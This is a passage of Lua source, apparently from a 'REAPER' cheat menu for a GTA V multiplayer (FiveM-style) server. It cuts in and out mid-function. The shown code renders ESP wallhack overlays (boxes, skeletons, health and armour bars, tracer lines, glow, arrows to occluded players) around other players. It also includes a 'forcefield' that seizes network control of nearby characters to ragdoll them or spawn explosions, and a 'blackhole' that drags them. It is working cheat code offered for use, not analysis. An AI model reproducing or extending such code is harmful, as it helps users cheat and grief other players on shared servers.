                            tfr, tbr, bfr, bbr, tfl, tbl, bfl, bbl = __REAPER1__.F.EntityDimensions(v)
                        end

                        if __REAPER1__.A['visuals_boundingbox'].func and __REAPER1__.A['visuals_target'].sindex == 1 and (not __REAPER1__.A['visuals_onlyplayers'].func or __REAPER1__.N.IsPedAPlayer(v)) and (not __REAPER1__.A['visuals_onlyalive'].func or __REAPER1__.N.GetEntityHealth(v) > 100) and (not __REAPER1__.A['visuals_distance'].toggle or #(coords - tcoords) <= __REAPER1__.A['visuals_distance'].sindex) then
                            __REAPER1__.F.BoundingBox(tfr, tbr, bfr, bbr, tfl, tbl, bfl, bbl)
                        end

                        if __REAPER1__.A['visuals_boxfilling'].func and __REAPER1__.A['visuals_ftarget'].sindex == 1 and (not __REAPER1__.A['visuals_fonlyplayers'].func or __REAPER1__.N.IsPedAPlayer(v)) and (not __REAPER1__.A['visuals_fonlyalive'].func or __REAPER1__.N.GetEntityHealth(v) > 100) and (not __REAPER1__.A['visuals_fdistance'].toggle or #(coords - tcoords) <= __REAPER1__.A['visuals_fdistance'].sindex) then
                            __REAPER1__.F.BoundingBoxFill(tfr, tbr, bfr, bbr, tfl, tbl, bfl, bbl)
                        end

                        if __REAPER1__.A['visuals:textesp_textesp'].func and __REAPER1__.A['visuals:textesp_target'].sindex == 1 and (not __REAPER1__.A['visuals:textesp_onlyplayers'].func or __REAPER1__.N.IsPedAPlayer(v)) and (not __REAPER1__.A['visuals:textesp_distance'].toggle and #(coords - tcoords) <= __REAPER1__.A['visuals:textesp_distance'].sindex) and (not __REAPER1__.A['visuals:textesp_onlyalive'].func or __REAPER1__.N.GetEntityHealth(v) > 100) then
                            __REAPER1__.F.DrawTextEsp(v, coords, tcoords)
                        end

                        if __REAPER1__.A['visuals:glow_glow'].func and __REAPER1__.A['visuals:glow_target'].sindex == 1 and (not __REAPER1__.A['visuals:glow_flashing'].func or __REAPER1__.N.GetGameTimer() >= (__REAPER1__.V.GlowFlash or 0)) and __REAPER1__.N.IsEntityAPed(v) and not __REAPER1__.N.IsPedInAnyVehicle(v) (not __REAPER1__.A['visuals:glow_onlyplayers'].func or __REAPER1__.N.IsPedAPlayer(v)) and (not __REAPER1__.A['visuals:glow_self'].func and v ~= __REAPER1__.V.SelfPed or __REAPER1__.A['visuals:glow_self'].func) and (not __REAPER1__.A['visuals:glow_distance'].toggle or #(coords - tcoords) <= __REAPER1__.A['visuals:glow_distance'].sindex) then
                            __REAPER1__.F.Glowing(tcoords)

                            if __REAPER1__.A['visuals:glow_flashing'].func then
                                __REAPER1__.V.GlowFlash = __REAPER1__.N.GetGameTimer() + 100
                            end
                        end

                        if __REAPER1__.A['visuals:boxesp_boxesp'].func and __REAPER1__.A['visuals:boxesp_target'].sindex == 1 and (not __REAPER1__.A['visuals:boxesp_onlyplayers'].func or __REAPER1__.N.IsPedAPlayer(v)) and (not __REAPER1__.A['visuals:boxesp_distance'].toggle or #(coords - tcoords) <= __REAPER1__.A['visuals:boxesp_distance'].sindex) and (not __REAPER1__.A['visuals:boxesp_onlyalive'].func or __REAPER1__.N.GetEntityHealth(v) > 100) then
                            __REAPER1__.F.BoxEsp(v, tcoords, sx, sy, w, y, w2, y2)
                        end

                        if __REAPER1__.A['visuals:boxesp_fboxesp'].func and __REAPER1__.A['visuals:boxesp_ftarget'].sindex == 1 and (not __REAPER1__.A['visuals:boxesp_fonlyplayers'].func or __REAPER1__.N.IsPedAPlayer(v)) and (not __REAPER1__.A['visuals:boxesp_fdistance'].toggle or #(coords - tcoords) <= __REAPER1__.A['visuals:boxesp_fdistance'].sindex) and (not __REAPER1__.A['visuals:boxesp_fonlyalive'].func or __REAPER1__.N.GetEntityHealth(v) > 100) then
                            __REAPER1__.F.BoxEspFill(v, tcoords, sx, sy, w, y, w2, y2)
                        end

                        if __REAPER1__.A['visuals:baresp_baresp'].func and __REAPER1__.A['visuals:baresp_target'].sindex == 1 and (not __REAPER1__.A['visuals:baresp_onlyplayers'].func or __REAPER1__.N.IsPedAPlayer(v)) and (not __REAPER1__.A['visuals:baresp_distance'].toggle or #(coords - tcoords) <= __REAPER1__.A['visuals:baresp_distance'].sindex) and (not __REAPER1__.A['visuals:baresp_onlyalive'].func or __REAPER1__.N.GetEntityHealth(v) > 100) then
                            __REAPER1__.F.HealthBarEsp(v, tcoords, sx, sy, w, y, w2, y2)
                        end
                        
                        if __REAPER1__.A['visuals:baresp_fbaresp'].func and __REAPER1__.A['visuals:baresp_ftarget'].sindex == 1 and (not __REAPER1__.A['visuals:baresp_fonlyplayers'].func or __REAPER1__.N.IsPedAPlayer(v)) and (not __REAPER1__.A['visuals:baresp_fdistance'].toggle or #(coords - tcoords) <= __REAPER1__.A['visuals:baresp_fdistance'].sindex) and (not __REAPER1__.A['visuals:baresp_fonlyalive'].func or __REAPER1__.N.GetEntityHealth(v) > 100) then
                            __REAPER1__.F.ArmourBarEsp(v, tcoords, sx, sy, w, y, w2, y2)
                        end

                        if __REAPER1__.A['visuals:lineesp_lineesp'].func and __REAPER1__.A['visuals:lineesp_target'].sindex == 1 and (not __REAPER1__.A['visuals:lineesp_onlyplayers'].func or __REAPER1__.N.IsPedAPlayer(v)) and (not __REAPER1__.A['visuals:lineesp_distance'].toggle or #(coords - tcoords) <= __REAPER1__.A['visuals:lineesp_distance'].sindex) and (not __REAPER1__.A['visuals:lineesp_onlyalive'].func or __REAPER1__.N.GetEntityHealth(v) > 100) then
                            __REAPER1__.F.LineEsp(v, coords, tcoords)
                        end

                        if __REAPER1__.A['visuals:markers_markers'].func and __REAPER1__.A['visuals:markers_target'].sindex == 1 and (not __REAPER1__.A['visuals:markers_onlyplayers'].func or __REAPER1__.N.IsPedAPlayer(v)) and (not __REAPER1__.A['visuals:markers_distance'].toggle or #(coords - tcoords) <= __REAPER1__.A['visuals:markers_distance'].sindex) and (not __REAPER1__.A['visuals:markers_onlyalive'].func or __REAPER1__.N.GetEntityHealth(v) > 100) then
                            __REAPER1__.F.MarkerEsp(v, tcoords)
                        end

                        if __REAPER1__.A['visuals:skeletonesp_skeletonesp'].func and __REAPER1__.A['visuals:skeletonesp_target'].sindex == 1 and (not __REAPER1__.A['visuals:skeletonesp_onlyplayers'].func or __REAPER1__.N.IsPedAPlayer(v)) and (not __REAPER1__.A['visuals:skeletonesp_distance'].toggle or #(coords - tcoords) <= __REAPER1__.A['visuals:skeletonesp_distance'].sindex) and (not __REAPER1__.A['visuals:skeletonesp_onlyalive'].func or __REAPER1__.N.GetEntityHealth(v) > 100) then
                            __REAPER1__.F.SkeletonEsp(v)
                        end
                    end
                end

                if __REAPER1__.A['visuals_boundingbox'].func and __REAPER1__.A['visuals_target'].sindex == 2 or
                __REAPER1__.A['visuals_boxfilling'].func and __REAPER1__.A['visuals_ftarget'].sindex == 2 or
                __REAPER1__.A['visuals:textesp_textesp'].func and __REAPER1__.A['visuals:textesp_target'].sindex == 2 or
                __REAPER1__.A['visuals:glow_glow'].func and __REAPER1__.A['visuals:glow_target'].sindex == 2 or
                __REAPER1__.A['visuals:boxesp_boxesp'].func and __REAPER1__.A['visuals:boxesp_target'].sindex == 2 or
                __REAPER1__.A['visuals:boxesp_fboxesp'].func and __REAPER1__.A['visuals:boxesp_ftarget'].sindex == 2 or
                __REAPER1__.A['visuals:baresp_baresp'].func and __REAPER1__.A['visuals:baresp_target'].sindex == 2 or
                __REAPER1__.A['visuals:baresp_fbaresp'].func and __REAPER1__.A['visuals:baresp_ftarget'].sindex == 2 or
                __REAPER1__.A['visuals:lineesp_lineesp'].func and __REAPER1__.A['visuals:lineesp_target'].sindex == 2 or
                __REAPER1__.A['visuals:markers_markers'].func and __REAPER1__.A['visuals:markers_target'].sindex == 2 or
                __REAPER1__.A['visuals:skeletonesp_skeletonesp'].func and __REAPER1__.A['visuals:skeletonesp_target'].sindex == 2 or
                __REAPER1__.A['visuals:fovarrow_fovarrow'].func and __REAPER1__.A['visuals:fovarrow_target'].sindex == 1 then
                    local v = __REAPER1__.F.ClosestEntity('player')
                    local coords = __REAPER1__.A['misc:freecam_freecam'].func and __REAPER1__.V.FreecamC or __REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed)

                    if v then
                        local tcoords = __REAPER1__.N.GetEntityCoords(v)
                        local tfr, tbr, bfr, bbr, tfl, tbl, bfl, bbl = nil, nil, nil, nil, nil, nil, nil, nil
                        local sx, sy, w, y, w2, y2 = nil, nil, nil, nil, nil, nil
                        local boundingcheck = __REAPER1__.A['visuals_boundingbox'].func and __REAPER1__.A['visuals_target'].sindex == 2 or __REAPER1__.A['visuals_boxfilling'].func and __REAPER1__.A['visuals_ftarget'].sindex == 2

                        if __REAPER1__.A['visuals:boxesp_boxesp'].func and __REAPER1__.A['visuals:boxesp_target'].sindex == 2 or __REAPER1__.A['visuals:boxesp_fboxesp'].func and __REAPER1__.A['visuals:boxesp_ftarget'].sindex == 2 or __REAPER1__.A['visuals:baresp_baresp'].func and __REAPER1__.A['visuals:baresp_target'].sindex == 2 or __REAPER1__.A['visuals:baresp_fbaresp'].func and __REAPER1__.A['visuals:baresp_ftarget'].sindex == 2 then
                            tfr, tbr, bfr, bbr, tfl, tbl, bfl, bbl = __REAPER1__.F.EntityDimensions(v, boundingcheck and 'cock' or 'min')
                            sx, sy, w, y, w2, y2 = __REAPER1__.F.Entity2dDimensions(tcoords, tfr, bbl, tfl, bbr)
                        elseif boundingcheck then
                            tfr, tbr, bfr, bbr, tfl, tbl, bfl, bbl = __REAPER1__.F.EntityDimensions(v)
                        end

                        if __REAPER1__.A['visuals_boundingbox'].func and __REAPER1__.A['visuals_target'].sindex == 2 and (not __REAPER1__.A['visuals_onlyalive'].func or __REAPER1__.N.GetEntityHealth(v) > 100) and (not __REAPER1__.A['visuals_distance'].toggle or #(coords - tcoords) <= __REAPER1__.A['visuals_distance'].sindex) then
                            __REAPER1__.F.BoundingBox(tfr, tbr, bfr, bbr, tfl, tbl, bfl, bbl)
                        end

                        if __REAPER1__.A['visuals_boxfilling'].func and __REAPER1__.A['visuals_ftarget'].sindex == 2 and (not __REAPER1__.A['visuals_fonlyalive'].func or __REAPER1__.N.GetEntityHealth(v) > 100) and (not __REAPER1__.A['visuals_fdistance'].toggle or #(coords - tcoords) <= __REAPER1__.A['visuals_fdistance'].sindex) then
                            __REAPER1__.F.BoundingBoxFill(tfr, tbr, bfr, bbr, tfl, tbl, bfl, bbl)
                        end

                        
                        if __REAPER1__.A['visuals:lineesp_lineesp'].func and __REAPER1__.A['visuals:lineesp_target'].sindex == 2 and (not __REAPER1__.A['visuals:lineesp_distance'].toggle or #(coords - tcoords) <= __REAPER1__.A['visuals:lineesp_distance'].sindex) and (not __REAPER1__.A['visuals:lineesp_onlyalive'].func or __REAPER1__.N.GetEntityHealth(v) > 100) then
                            __REAPER1__.F.LineEsp(v, coords, tcoords)
                        end

                        if __REAPER1__.N.IsEntityOnScreen(v) then
                            if __REAPER1__.A['visuals:textesp_textesp'].func and __REAPER1__.A['visuals:textesp_target'].sindex == 2 and (not __REAPER1__.A['visuals:textesp_distance'].toggle or #(coords - tcoords) <= __REAPER1__.A['visuals:textesp_distance'].sindex) and (not __REAPER1__.A['visuals:textesp_onlyalive'].func or __REAPER1__.N.GetEntityHealth(v) > 100) then
                                __REAPER1__.F.DrawTextEsp(v, coords, tcoords)
                            end

                            if __REAPER1__.A['visuals:glow_glow'].func and __REAPER1__.A['visuals:glow_target'].sindex == 2 and (not __REAPER1__.A['visuals:glow_flashing'].func or __REAPER1__.N.GetGameTimer() >= (__REAPER1__.V.GlowFlash or 0)) and not __REAPER1__.N.IsPedInAnyVehicle(v) and (not __REAPER1__.A['visuals:glow_self'].func and v ~= __REAPER1__.V.SelfPed or __REAPER1__.A['visuals:glow_self'].func) and (not __REAPER1__.A['visuals:glow_distance'].toggle or #(coords - tcoords) <= __REAPER1__.A['visuals:glow_distance'].sindex) then
                                __REAPER1__.F.Glowing(tcoords)

                                if __REAPER1__.A['visuals:glow_flashing'].func then
                                    __REAPER1__.V.GlowFlash = __REAPER1__.N.GetGameTimer() + 100
                                end
                            end

                            if __REAPER1__.A['visuals:boxesp_boxesp'].func and __REAPER1__.A['visuals:boxesp_target'].sindex == 2 and (not __REAPER1__.A['visuals:boxesp_distance'].toggle or #(coords - tcoords) <= __REAPER1__.A['visuals:boxesp_distance'].sindex) and (not __REAPER1__.A['visuals:boxesp_onlyalive'].func or __REAPER1__.N.GetEntityHealth(v) > 100) then
                                __REAPER1__.F.BoxEsp(v, tcoords, sx, sy, w, y, w2, y2)
                            end

                            if __REAPER1__.A['visuals:boxesp_fboxesp'].func and __REAPER1__.A['visuals:boxesp_ftarget'].sindex == 2 and (not __REAPER1__.A['visuals:boxesp_fdistance'].toggle or #(coords - tcoords) <= __REAPER1__.A['visuals:boxesp_fdistance'].sindex) and (not __REAPER1__.A['visuals:boxesp_fonlyalive'].func or __REAPER1__.N.GetEntityHealth(v) > 100) then
                                __REAPER1__.F.BoxEspFill(v, tcoords, sx, sy, w, y, w2, y2)
                            end

                            if __REAPER1__.A['visuals:baresp_baresp'].func and __REAPER1__.A['visuals:baresp_target'].sindex == 2 and (not __REAPER1__.A['visuals:baresp_onlyplayers'].func or __REAPER1__.N.IsPedAPlayer(v)) and (not __REAPER1__.A['visuals:baresp_distance'].toggle or #(coords - tcoords) <= __REAPER1__.A['visuals:baresp_distance'].sindex) and (not __REAPER1__.A['visuals:baresp_onlyalive'].func or __REAPER1__.N.GetEntityHealth(v) > 100) then
                                __REAPER1__.F.HealthBarEsp(v, tcoords, sx, sy, w, y, w2, y2)
                            end
                            
                            if __REAPER1__.A['visuals:baresp_fbaresp'].func and __REAPER1__.A['visuals:baresp_ftarget'].sindex == 2 and (not __REAPER1__.A['visuals:baresp_fonlyplayers'].func or __REAPER1__.N.IsPedAPlayer(v)) and (not __REAPER1__.A['visuals:baresp_fdistance'].toggle or #(coords - tcoords) <= __REAPER1__.A['visuals:baresp_fdistance'].sindex) and (not __REAPER1__.A['visuals:baresp_fonlyalive'].func or __REAPER1__.N.GetEntityHealth(v) > 100) then
                                __REAPER1__.F.ArmourBarEsp(v, tcoords, sx, sy, w, y, w2, y2)
                            end

                            if __REAPER1__.A['visuals:markers_markers'].func and __REAPER1__.A['visuals:markers_target'].sindex == 2 and (not __REAPER1__.A['visuals:markers_distance'].toggle or #(coords - tcoords) <= __REAPER1__.A['visuals:markers_distance'].sindex) and (not __REAPER1__.A['visuals:markers_onlyalive'].func or __REAPER1__.N.GetEntityHealth(v) > 100) then
                                __REAPER1__.F.MarkerEsp(v, tcoords)
                            end

                            if __REAPER1__.A['visuals:skeletonesp_skeletonesp'].func and __REAPER1__.A['visuals:skeletonesp_target'].sindex == 2 and (not __REAPER1__.A['visuals:skeletonesp_distance'].toggle or #(coords - tcoords) <= __REAPER1__.A['visuals:skeletonesp_distance'].sindex) and (not __REAPER1__.A['visuals:skeletonesp_onlyalive'].func or __REAPER1__.N.GetEntityHealth(v) > 100) then
                                __REAPER1__.F.SkeletonEsp(v)
                            end
                        end

                        if __REAPER1__.A['visuals:fovarrow_fovarrow'].func and __REAPER1__.A['visuals:fovarrow_target'].sindex == 1 then
                            if __REAPER1__.A['visuals:fovarrow_occluded'].func then
                                local occl =  __REAPER1__.N.HasEntityClearLosToEntity(__REAPER1__.V.SelfPed, v, 17)
                                if (not __REAPER1__.N.IsEntityOnScreen(v) or not occl) and (not __REAPER1__.A['visuals:fovarrow_distance'].toggle or #(coords - tcoords) <= __REAPER1__.A['visuals:fovarrow_distance'].sindex) and (not __REAPER1__.A['visuals:fovarrow_onlyalive'].func or __REAPER1__.N.GetEntityHealth(v) > 100) then
                                    __REAPER1__.F.FovArrows(tcoords, coords, occl)
                                end
                            elseif not __REAPER1__.N.IsEntityOnScreen(v) and (not __REAPER1__.A['visuals:fovarrow_distance'].toggle or #(coords - tcoords) <= __REAPER1__.A['visuals:fovarrow_distance'].sindex) and (not __REAPER1__.A['visuals:fovarrow_onlyalive'].func or __REAPER1__.N.GetEntityHealth(v) > 100) then
                                __REAPER1__.F.FovArrows(tcoords, coords, v)
                            end
                        end
                    end
                end

                if __REAPER1__.A['player:forcefield_forcefield'].func and __REAPER1__.A['player:forcefield_pedestrian'].func or
                __REAPER1__.A['combat_hitmarker'].func and __REAPER1__.V.CombRet or
                __REAPER1__.A['combat_hitsound'].func and __REAPER1__.V.CombRet or
                __REAPER1__.A['visuals_boundingbox'].func and __REAPER1__.A['visuals_target'].sindex == 3 or
                __REAPER1__.A['visuals_boxfilling'].func and __REAPER1__.A['visuals_ftarget'].sindex == 3 or
                __REAPER1__.A['visuals:textesp_textesp'].func and __REAPER1__.A['visuals:textesp_target'].sindex == 3 or
                __REAPER1__.A['visuals:glow_glow'].func and __REAPER1__.A['visuals:glow_target'].sindex == 3 or
                __REAPER1__.A['visuals:boxesp_boxesp'].func and __REAPER1__.A['visuals:boxesp_target'].sindex == 3 or
                __REAPER1__.A['visuals:boxesp_fboxesp'].func and __REAPER1__.A['visuals:boxesp_ftarget'].sindex == 3 or
                __REAPER1__.A['visuals:baresp_baresp'].func and __REAPER1__.A['visuals:baresp_target'].sindex == 3 or
                __REAPER1__.A['visuals:baresp_fbaresp'].func and __REAPER1__.A['visuals:baresp_ftarget'].sindex == 3 or
                __REAPER1__.A['visuals:lineesp_lineesp'].func and __REAPER1__.A['visuals:lineesp_target'].sindex == 3 or
                __REAPER1__.A['visuals:markers_markers'].func and __REAPER1__.A['visuals:markers_target'].sindex == 3 or
                __REAPER1__.A['visuals:blips_blips'].func and __REAPER1__.A['visuals:blips_target'].sindex == 1 or
                __REAPER1__.A['world:blackmagic_blackhole'].func and __REAPER1__.A['world:blackmagic_pedestrians'].func or
                __REAPER1__.A['visuals:skeletonesp_skeletonesp'].func and __REAPER1__.A['visuals:skeletonesp_target'].sindex == 3 or
                __REAPER1__.A['visuals:fovarrow_fovarrow'].func and __REAPER1__.A['visuals:fovarrow_target'].sindex == 2 or
                __REAPER1__.A['server_anticlone'].func then
                    local coords = __REAPER1__.A['misc:freecam_freecam'].func and __REAPER1__.V.FreecamC or __REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed)
                    local tfr, tbr, bfr, bbr, tfl, tbl, bfl, bbl = nil, nil, nil, nil, nil, nil, nil, nil
                    local sx, sy, w, y, w2, y2 = nil, nil, nil, nil, nil, nil
                    local so1, so2, so3, so4, so5, so6, somodel = nil, nil, nil, nil, nil, nil, nil

                    if __REAPER1__.A['server_anticlone'].func then
                        so1, so2, so3, so4, so5, so6 = __REAPER1__.N.CopyOutfit(__REAPER1__.V.SelfPed, true)
                        somodel = __REAPER1__.N.GetEntityModel(__REAPER1__.V.SelfPed)
                    end

                    for k,v in pairs(__REAPER1__.N.GameTable('CPed')) do
                        local tcoords = __REAPER1__.N.GetEntityCoords(v)

                        if __REAPER1__.A['player:forcefield_forcefield'].func and __REAPER1__.A['player:forcefield_pedestrian'].func then
                            if v ~= __REAPER1__.V.SelfPed and not __REAPER1__.N.IsPedAPlayer(v) and #(coords - tcoords) <= __REAPER1__.A['player:forcefield_range'].sindex * 1.2 then
                                __REAPER25__(function()
                                    if __REAPER1__.F.NetControl(v) then
                                        if __REAPER1__.A['player:forcefield_type'].sindex == 1 then
                                            __REAPER1__.N.SetPedToRagdoll(v, 1000, 1000, 0, 0, 0, 0)
                                        elseif __REAPER1__.A['player:forcefield_type'].sindex == 2 then
                                            __REAPER1__.N.SetPedRagdollOnCollision(v, true)
                                            __REAPER1__.N.SetPedRagdollForceFall(v)
                                            __REAPER1__.F.ApplyShockwave(v, coords, tcoords)
                                        end

                                        if __REAPER1__.A['player:forcefield_explode'].toggle then
                                            __REAPER1__.N.CreateExplosion(tcoords, __REAPER1__.A['player:forcefield_explode'].sindex - 1, 1000.0, true, true, 0)
                                        end
                                    end
                                    __REAPER26__(0)
                                end)
                            end
                        end

                        if (__REAPER1__.A['combat_hitmarker'].func or __REAPER1__.A['combat_hitsound'].func) and __REAPER1__.V.CombRet and v ~= __REAPER1__.V.SelfPed then
                            if not __REAPER1__.N.IsEntityDead(v) or __REAPER1__.N.GetPedSourceOfDeath(v) == __REAPER1__.V.SelfPed and __REAPER1__.N.GetGameTimer() - __REAPER1__.N.GetPedTimeOfDeath(v) < 250 then
                                if #(__REAPER1__.V.CombCoords - tcoords) <= (__REAPER1__.N.GetWeapontypeGroup(__REAPER1__.N.GetSelectedPedWeapon(__REAPER1__.V.SelfPed)) == 860033945 and 5.0 or 1.2) and __REAPER1__.N.HasEntityBeenDamagedByWeapon(v, 0, 2) then
                                    if __REAPER1__.A['combat_hitmarker'].func then
                                        __REAPER25__(function()
                                            local time = __REAPER1__.N.GetGameTimer() + __REAPER1__.A['combat_duration'].sindex
                                            local r, g, b, a = __REAPER1__.F.TableToColor(__REAPER1__.A['combat_color'].menuextra)
                                            local coords = __REAPER1__.V.CombCoords
                                            while time >= __REAPER1__.N.GetGameTimer() do
                                                __REAPER26__(0)
                                                if __REAPER1__.A['combat_position'].sindex == 1 then
                                                    __REAPER1__.N.DrawSprite(__REAPER1__.A['combat_htype'].sindex == 2 and 'helicopterhud' or 'srange_gen', __REAPER1__.A['combat_htype'].sindex == 2 and 'hud_target' or 'hit_cross', 0.5, 0.5, 0.003 * __REAPER1__.A['combat_size'].sindex, 0.0055 * __REAPER1__.A['combat_size'].sindex, __REAPER1__.A['combat_htype'].sindex == 2 and 43.0 or 0, __REAPER1__.A['combat_htype'].sindex == 2 and 255 or r, __REAPER1__.A['combat_htype'].sindex == 2 and 255 or g, __REAPER1__.A['combat_htype'].sindex == 2 and 255 or b, a, true)
                                                else
                                                    local ret, sx, sy = __REAPER1__.N.GetScreenCoordFromWorldCoord(coords.x, coords.y, coords.z)
                                                    __REAPER1__.N.DrawSprite(__REAPER1__.A['combat_htype'].sindex == 2 and 'helicopterhud' or 'srange_gen', __REAPER1__.A['combat_htype'].sindex == 2 and 'hud_target' or 'hit_cross', sx, sy, 0.003 * __REAPER1__.A['combat_size'].sindex, 0.0055 * __REAPER1__.A['combat_size'].sindex, __REAPER1__.A['combat_htype'].sindex == 2 and 43.0 or 0, __REAPER1__.A['combat_htype'].sindex == 2 and 255 or r, __REAPER1__.A['combat_htype'].sindex == 2 and 255 or g, __REAPER1__.A['combat_htype'].sindex == 2 and 255 or b, a, true)
                                                end
                                            end
                                        end)
                                    end
                                    if __REAPER1__.A['combat_hitsound'].func then
                                        if __REAPER1__.A['combat_delay'].sindex ~= 1 then
                                            __REAPER25__(function()
                                                local time = __REAPER1__.N.GetGameTimer() + __REAPER1__.A['combat_delay'].sindex
                                                while time >= __REAPER1__.N.GetGameTimer() do
                                                    __REAPER26__(0)
                                                end
                                                if __REAPER1__.A['combat_customsound'].func == 'None' then __REAPER1__.N.SetDuiUrl(__REAPER1__.V.CustomSound, tostring(__REAPER1__.A['combat_customsound'].func))
                                                else __REAPER1__.N.SetDuiUrl(__REAPER1__.V.CustomSound, __REAPER1__.T.HitSounds[__REAPER1__.A['combat_type'].sindex])
                                                end
                                            end)
                                        else
                                            if __REAPER1__.A['combat_customsound'].func == 'None' then __REAPER1__.N.SetDuiUrl(__REAPER1__.V.CustomSound, tostring(__REAPER1__.A['combat_customsound'].func))
                                            else __REAPER1__.N.SetDuiUrl(__REAPER1__.V.CustomSound, __REAPER1__.T.HitSounds[__REAPER1__.A['combat_type'].sindex])
                                            end
                                        end
                                    end
                                    __REAPER1__.N.ClearEntityLastDamageEntity(v)
                                end
                            end
                        end

                        if __REAPER1__.A['world:blackmagic_blackhole'].func and __REAPER1__.A['world:blackmagic_pedestrians'].func and not __REAPER1__.N.IsPedAPlayer(v) and __REAPER1__.V.BlackholePos then
                            __REAPER25__(function()
                                if __REAPER1__.F.NetControl(v) then
                                    local pos1 = (__REAPER1__.V.BlackholePos - tcoords) * (__REAPER1__.A['world:blackmagic_strength'].sindex / 30)
                                    local pos2 = __REAPER1__.N.GetEntityVelocity(v) * (2.0 * (__REAPER1__.A['world:blackmagic_strength'].sindex / 100) * 0.3) + vector3(0.0, 0.0, 0.1)
                                    __REAPER1__.N.ApplyForceToEntity(v, 3, pos1 - pos2, 0, 0, 0, false, false, true, true, false, true)
                                end
                            end)
                        end

                        if __REAPER1__.A['visuals:lineesp_lineesp'].func and __REAPER1__.A['visuals:lineesp_target'].sindex == 3 and (not __REAPER1__.A['visuals:lineesp_onlyplayers'].func or __REAPER1__.N.IsPedAPlayer(v)) and (not __REAPER1__.A['visuals:lineesp_distance'].toggle or #(coords - tcoords) <= __REAPER1__.A['visuals:lineesp_distance'].sindex) and (not __REAPER1__.A['visuals:lineesp_onlyalive'].func or __REAPER1__.N.GetEntityHealth(v) > 100) then
                            __REAPER1__.F.LineEsp(v, coords, tcoords)
                        end

                        if __REAPER1__.N.IsEntityOnScreen(v) then
                            local boundingcheck = __REAPER1__.A['visuals_boundingbox'].func and __REAPER1__.A['visuals_target'].sindex == 3 or __REAPER1__.A['visuals_boxfilling'].func and __REAPER1__.A['visuals_ftarget'].sindex == 3
                            if __REAPER1__.A['visuals:boxesp_boxesp'].func and __REAPER1__.A['visuals:boxesp_target'].sindex == 3 or __REAPER1__.A['visuals:boxesp_fboxesp'].func and __REAPER1__.A['visuals:boxesp_ftarget'].sindex == 3 or __REAPER1__.A['visuals:baresp_baresp'].func and __REAPER1__.A['visuals:baresp_target'].sindex == 3 or __REAPER1__.A['visuals:baresp_fbaresp'].func and __REAPER1__.A['visuals:baresp_ftarget'].sindex == 3 then
                                tfr, tbr, bfr, bbr, tfl, tbl, bfl, bbl = __REAPER1__.F.EntityDimensions(v, boundingcheck and 'cock' or 'min')
                                sx, sy, w, y, w2, y2 = __REAPER1__.F.Entity2dDimensions(tcoords, tfr, bbl, tfl, bbr)
                            elseif boundingcheck then
                                tfr, tbr, bfr, bbr, tfl, tbl, bfl, bbl = __REAPER1__.F.EntityDimensions(v)
                            end

                            if __REAPER1__.A['visuals_boundingbox'].func and __REAPER1__.A['visuals_target'].sindex == 3 and (__REAPER1__.A['visuals_self'].func or v ~= __REAPER1__.V.SelfPed) and (not __REAPER1__.A['visuals_onlyplayers'].func or __REAPER1__.N.IsPedAPlayer(v)) and (not __REAPER1__.A['visuals_onlyalive'].func or __REAPER1__.N.GetEntityHealth(v) > 100) and (not __REAPER1__.A['visuals_distance'].toggle or #(coords - tcoords) <= __REAPER1__.A['visuals_distance'].sindex) then
                                __REAPER1__.F.BoundingBox(tfr, tbr, bfr, bbr, tfl, tbl, bfl, bbl)
                            end

                            if __REAPER1__.A['visuals_boxfilling'].func and __REAPER1__.A['visuals_ftarget'].sindex == 3 and (__REAPER1__.A['visuals_fself'].func or v ~= __REAPER1__.V.SelfPed) and (not __REAPER1__.A['visuals_fonlyplayers'].func or __REAPER1__.N.IsPedAPlayer(v)) and (not __REAPER1__.A['visuals_fonlyalive'].func or __REAPER1__.N.GetEntityHealth(v) > 100) and (not __REAPER1__.A['visuals_fdistance'].toggle or #(coords - tcoords) <= __REAPER1__.A['visuals_fdistance'].sindex) then
                                __REAPER1__.F.BoundingBoxFill(tfr, tbr, bfr, bbr, tfl, tbl, bfl, bbl)
                            end

                            if __REAPER1__.A['visuals:textesp_textesp'].func and __REAPER1__.A['visuals:textesp_target'].sindex == 3 and (not __REAPER1__.A['visuals:textesp_onlyplayers'].func or __REAPER1__.N.IsPedAPlayer(v)) and (not __REAPER1__.A['visuals:textesp_self'].func and v ~= __REAPER1__.V.SelfPed or __REAPER1__.A['visuals:textesp_self'].func) and (not __REAPER1__.A['visuals:textesp_distance'].toggle or #(coords - tcoords) <= __REAPER1__.A['visuals:textesp_distance'].sindex) and (not __REAPER1__.A['visuals:textesp_onlyalive'].func or __REAPER1__.N.GetEntityHealth(v) > 100) then
                                __REAPER1__.F.DrawTextEsp(v, coords, tcoords)
                            end

                            if __REAPER1__.A['visuals:glow_glow'].func and __REAPER1__.A['visuals:glow_target'].sindex == 3 and (not __REAPER1__.A['visuals:glow_onlyplayers'].func or __REAPER1__.N.IsPedAPlayer(v)) and (not __REAPER1__.A['visuals:glow_flashing'].func or __REAPER1__.N.GetGameTimer() >= (__REAPER1__.V.GlowFlash or 0)) and (not __REAPER1__.A['visuals:glow_self'].func and v ~= __REAPER1__.V.SelfPed or __REAPER1__.A['visuals:glow_self'].func) and not __REAPER1__.N.IsPedInAnyVehicle(v) and (not __REAPER1__.A['visuals:glow_distance'].toggle or #(coords - tcoords) <= __REAPER1__.A['visuals:glow_distance'].sindex) then
                                __REAPER1__.F.Glowing(tcoords)

                                if __REAPER1__.A['visuals:glow_flashing'].func and k == #__REAPER1__.N.GameTable('CPed') - 1 then
                                    __REAPER1__.V.GlowFlash = __REAPER1__.N.GetGameTimer() + 100
                                end
                            end

                            if __REAPER1__.A['visuals:boxesp_boxesp'].func and __REAPER1__.A['visuals:boxesp_target'].sindex == 3 and (not __REAPER1__.A['visuals:boxesp_onlyplayers'].func or __REAPER1__.N.IsPedAPlayer(v)) and (not __REAPER1__.A['visuals:boxesp_self'].func and v ~= __REAPER1__.V.SelfPed or __REAPER1__.A['visuals:boxesp_self'].func) and (not __REAPER1__.A['visuals:boxesp_distance'].toggle or #(coords - tcoords) <= __REAPER1__.A['visuals:boxesp_distance'].sindex) and (not __REAPER1__.A['visuals:boxesp_onlyalive'].func or __REAPER1__.N.GetEntityHealth(v) > 100) then
                                __REAPER1__.F.BoxEsp(v, tcoords, sx, sy, w, y, w2, y2)
                            end

